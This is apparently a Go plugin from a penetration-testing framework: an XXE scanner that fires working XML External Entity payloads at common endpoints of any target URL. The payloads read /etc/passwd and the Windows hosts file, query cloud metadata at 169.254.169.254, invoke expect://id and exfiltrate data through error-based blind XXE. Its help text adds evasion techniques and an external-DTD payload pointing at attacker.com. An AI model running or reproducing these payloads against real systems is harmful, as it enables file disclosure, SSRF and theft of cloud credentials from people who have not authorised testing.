// internal/modules/web_vulnerabilities/xxe_scanner.go
package web_vulnerabilities

import (
	"apexPenetrateGo/internal/core"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type XXEResult struct {
	Target          string
	Vulnerable      bool
	TestedEndpoints []string
	Vulnerabilities []XXEVuln
	Note            string
}

type XXEVuln struct {
	Endpoint     string
	Payload      string
	Method       string
	StatusCode   int
	ResponseBody string
	Evidence     string
}

// XXE payloads for different scenarios
var xxePayloads = []string{
	// Basic XXE - file disclosure
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,

	// Windows file disclosure
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root>&xxe;</root>`,

	// HTTP request (SSRF via XXE)
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`,

	// Parameter entity
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>`,

	// Blind XXE with error
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">%error;%exfil;]>
<root>test</root>`,

	// XXE with expect protocol
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>`,

	// UTF-16 encoded XXE
	`<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
}

// Common endpoints that might accept XML
var xmlEndpoints = []string{
	"/api/xml", "/xml", "/upload", "/import", "/api/import", "/api/upload",
	"/api/data", "/data", "/api/v1/xml", "/api/v2/xml", "/xmlrpc", "/soap",
	"/api/soap", "/ws", "/webservice", "/api", "/rest/xml", "/feed",
}

func XXEScan(target string, customEndpoints []string, customPayloads []string) *XXEResult {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	endpoints := xmlEndpoints
	if len(customEndpoints) > 0 {
		endpoints = append(endpoints, customEndpoints...)
	}

	payloads := xxePayloads
	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	result := &XXEResult{
		Target:          target,
		TestedEndpoints: endpoints,
		Vulnerabilities: []XXEVuln{},
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	// Test each endpoint with each payload
	for _, endpoint := range endpoints {
		testURL := strings.TrimRight(target, "/") + endpoint

		for _, payload := range payloads {
			// Test POST request with XML
			vuln := testXXEEndpoint(client, testURL, "POST", payload)
			if vuln != nil {
				result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
				result.Vulnerable = true
			}

			// Test PUT request with XML (some APIs use PUT)
			vuln = testXXEEndpoint(client, testURL, "PUT", payload)
			if vuln != nil {
				result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
				result.Vulnerable = true
			}
		}
	}

	// Also test the main target URL
	for _, payload := range payloads {
		vuln := testXXEEndpoint(client, target, "POST", payload)
		if vuln != nil {
			result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
			result.Vulnerable = true
		}
	}

	if result.Vulnerable {
		result.Note = fmt.Sprintf("Found %d potential XXE vulnerabilities", len(result.Vulnerabilities))
	} else {
		result.Note = "No XXE vulnerabilities detected"
	}

	return result
}

func testXXEEndpoint(client *http.Client, url, method, payload string) *XXEVuln {
	req, err := http.NewRequest(method, url, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil
	}

	// Set appropriate headers for XML
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "application/xml, text/xml, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	responseBody := string(body)
	evidence := analyzeXXEResponse(responseBody, resp.StatusCode, payload)

	if evidence != "" {
		return &XXEVuln{
			Endpoint:     url,
			Payload:      payload,
			Method:       method,
			StatusCode:   resp.StatusCode,
			ResponseBody: responseBody[:min(len(responseBody), 500)], // Truncate for display
			Evidence:     evidence,
		}
	}

	return nil
}

func analyzeXXEResponse(responseBody string, statusCode int, payload string) string {
	responseLower := strings.ToLower(responseBody)

	// Check for file content disclosure
	if strings.Contains(responseLower, "root:x:0:0:") ||
		strings.Contains(responseLower, "/bin/bash") ||
		strings.Contains(responseLower, "/bin/sh") {
		return "Unix /etc/passwd file content detected in response"
	}

	// Windows hosts file
	if strings.Contains(responseLower, "127.0.0.1") && strings.Contains(responseLower, "localhost") {
		return "Windows hosts file content detected in response"
	}

	// AWS metadata
	if strings.Contains(responseLower, "ami-") ||
		strings.Contains(responseLower, "instance-id") ||
		strings.Contains(responseLower, "security-credentials") {
		return "AWS metadata content detected in response"
	}

	// Error messages that indicate XXE processing
	xxeErrors := []string{
		"external entity", "entity", "xml parsing", "xml parse error",
		"dtd", "document type definition", "system identifier",
		"entity reference", "malformed", "xml syntax error",
	}

	for _, errorMsg := range xxeErrors {
		if strings.Contains(responseLower, errorMsg) {
			return fmt.Sprintf("XXE-related error message detected: %s", errorMsg)
		}
	}

	// Different status codes might indicate XXE processing
	if statusCode == 500 && strings.Contains(payload, "file://") {
		return "HTTP 500 error when processing file:// entity"
	}

	// Check for time-based indicators (long processing time might indicate file access)
	if statusCode == 200 && len(responseBody) > 1000 {
		return "Large response body - possible file content disclosure"
	}

	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (r *XXEResult) String() string {
	status := "🔒"
	if r.Vulnerable {
		status = "🚨"
	}

	msg := fmt.Sprintf("\n%s XXE Scanner for %s:\n", status, r.Target)
	msg += fmt.Sprintf("  Tested %d endpoints with %d payloads\n", len(r.TestedEndpoints), len(xxePayloads))

	if r.Vulnerable {
		msg += fmt.Sprintf("  🚨 VULNERABLE: Found %d potential XXE issues:\n", len(r.Vulnerabilities))
		for i, vuln := range r.Vulnerabilities {
			msg += fmt.Sprintf("    %d. Endpoint: %s [%s]\n", i+1, vuln.Endpoint, vuln.Method)
			msg += fmt.Sprintf("       Status: %d\n", vuln.StatusCode)
			msg += fmt.Sprintf("       Evidence: %s\n", vuln.Evidence)
			if len(vuln.ResponseBody) > 0 {
				msg += fmt.Sprintf("       Response: %s...\n", vuln.ResponseBody[:min(len(vuln.ResponseBody), 100)])
			}
		}
	} else {
		msg += "  ✅ No XXE vulnerabilities found\n"
	}

	msg += fmt.Sprintf("  Note: %s\n", r.Note)
	return msg
}

// XXEScannerPlugin implements the Plugin interface for XXE scanning
// (for parametric/intelligent shell)
type xxeScannerPlugin struct{}

func (p *xxeScannerPlugin) Name() string { return "XXEScanner" }
func (p *xxeScannerPlugin) Description() string {
	return "Scans for XML External Entity (XXE) vulnerabilities"
}
func (p *xxeScannerPlugin) Category() string { return "web" }
func (p *xxeScannerPlugin) Options() []core.ModuleOption {
	return []core.ModuleOption{
		{Name: "payload", Type: "string", Default: xxePayloads[0], Description: "Custom XXE payload (leave blank for all)", Required: false},
		{Name: "endpoints", Type: "string", Default: "/api/xml,/upload,/soap,/rest", Description: "Comma-separated endpoints to test (relative to target)", Required: false},
		{Name: "method", Type: "string", Default: "POST", Description: "HTTP method (POST/PUT)", Required: false},
		{Name: "timeout", Type: "string", Default: "5s", Description: "Request timeout (e.g. 5s)", Required: false},
	}
}

func (p *xxeScannerPlugin) Run(target string, options map[string]interface{}) (interface{}, error) {
	payloads := xxePayloads
	if val, ok := options["payload"]; ok {
		if s, ok := val.(string); ok && s != "" {
			payloads = []string{s}
		}
	}
	endpoints := []string{"/api/xml", "/upload", "/soap", "/rest"}
	if val, ok := options["endpoints"]; ok {
		if s, ok := val.(string); ok && s != "" {
			parts := strings.Split(s, ",")
			for i := range parts {
				parts[i] = strings.TrimSpace(parts[i])
			}
			endpoints = parts
		}
	}
	method := "POST"
	if val, ok := options["method"]; ok {
		if s, ok := val.(string); ok && (s == "POST" || s == "PUT") {
			method = s
		}
	}
	timeout := 5 * time.Second
	if val, ok := options["timeout"]; ok {
		if s, ok := val.(string); ok && s != "" {
			if d, err := time.ParseDuration(s); err == nil {
				timeout = d
			}
		}
	}

	result := &XXEResult{
		Target:          target,
		Vulnerable:      false,
		TestedEndpoints: []string{},
		Vulnerabilities: []XXEVuln{},
	}

	client := &http.Client{Timeout: timeout}
	for _, endpoint := range endpoints {
		url := strings.TrimRight(target, "/") + endpoint
		result.TestedEndpoints = append(result.TestedEndpoints, url)
		for _, payload := range payloads {
			var req *http.Request
			if method == "POST" {
				req, _ = http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
			} else {
				req, _ = http.NewRequest("PUT", url, bytes.NewBuffer([]byte(payload)))
			}
			req.Header.Set("Content-Type", "application/xml")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			// Simple evidence: look for /etc/passwd, Windows hosts, or payload echo
			found := false
			var evidence string
			if strings.Contains(string(body), "root:x:") || strings.Contains(string(body), "[boot loader]") || strings.Contains(string(body), payload) {
				found = true
				evidence = string(body)
			}
			if found {
				result.Vulnerable = true
				result.Vulnerabilities = append(result.Vulnerabilities, XXEVuln{
					Endpoint:     url,
					Payload:      payload,
					Method:       method,
					StatusCode:   resp.StatusCode,
					ResponseBody: string(body),
					Evidence:     evidence,
				})
			}
			time.Sleep(300 * time.Millisecond)
		}
	}
	if result.Vulnerable {
		result.Note = "XXE vulnerability detected! Review evidence."
	} else {
		result.Note = "No XXE vulnerabilities detected."
	}
	return result, nil
}

func (p *xxeScannerPlugin) Help() string {
	return `
📄 XXE Scanner - XML External Entity Vulnerability Detector

DESCRIPTION:
  Detects XML External Entity (XXE) vulnerabilities where applications parse XML input
  without proper validation, potentially exposing sensitive files and internal systems.

USAGE:
  xxe <target_url> [options]

EXAMPLES:
  xxe https://example.com/upload
  xxe https://example.com/api/xml --timeout 10s
  xxe https://example.com/parser --payload custom

ATTACK SCENARIOS:
  • File Disclosure: Read sensitive files (/etc/passwd, web.config)
  • SSRF: Access internal services and networks
  • DoS: Billion laughs attack causing resource exhaustion
  • Port Scanning: Enumerate internal network services

XXE PAYLOAD TYPES:
  • Classic File Read: <!ENTITY xxe SYSTEM "file:///etc/passwd">
  • External DTD: <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
  • Parameter Entity: <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  • CDATA Extraction: Use CDATA to extract binary files
  • Blind XXE: Out-of-band data exfiltration

EVASION TECHNIQUES:
  • Encoding: Use different XML encodings (UTF-16, UTF-32)
  • Entity Nesting: Nested entity references
  • Protocol Bypass: Use different protocols (ftp://, http://, expect://)
  • DTD Pollution: Override internal DTDs with external ones

PRO TIPS:
  💡 Test all XML input points (uploads, APIs, config files)
  💡 Check for different response times indicating file access
  💡 Look for error messages revealing system information
  💡 Test with both internal and external entity references
  💡 Use out-of-band techniques for blind XXE detection
  💡 Check for partial file content in error messages

DETECTION METHODS:
  • Direct: Look for file contents in response
  • Error-based: Analyze error messages for file access attempts
  • Time-based: Monitor response delays for file operations
  • Out-of-band: Use external services to detect blind XXE

COMMON VULNERABLE ENDPOINTS:
  • File upload with XML processing
  • API endpoints accepting XML
  • Configuration file parsers
  • Document conversion services
  • SOAP web services

RISK LEVEL: High to Critical (file disclosure, SSRF, DoS)
`
}

func init() {
	core.RegisterPlugin(&xxeScannerPlugin{})
}
